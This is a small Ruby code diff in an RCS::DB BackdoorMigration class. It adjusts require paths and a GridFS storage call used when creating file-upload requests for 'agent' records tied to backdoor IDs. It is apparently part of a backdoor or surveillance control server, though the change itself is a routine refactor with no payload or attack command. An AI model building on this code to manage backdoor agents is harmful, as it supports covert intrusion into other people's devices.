@@ -1,5 +1,5 @@
-require 'rcs-db/db_layer'
-require 'rcs-db/grid'
+require_relative '../db_layer'
+require_relative '../grid'
 
 module RCS
 module DB
@@ -143,7 +143,7 @@ class BackdoorMigration
       agent = Item.where({_mid: up[:backdoor_id], _kind: 'agent'}).first
       begin
         upload = agent.upload_requests.create!(filename: up[:filename])
-        upload[:_grid] = [ GridFS.instance.put(up[:content], {filename: up[:filename]}) ]
+        upload[:_grid] = [ GridFS.put(up[:content], {filename: up[:filename]}) ]
         upload.save
       rescue Mongoid::Errors::Validations => e
         next
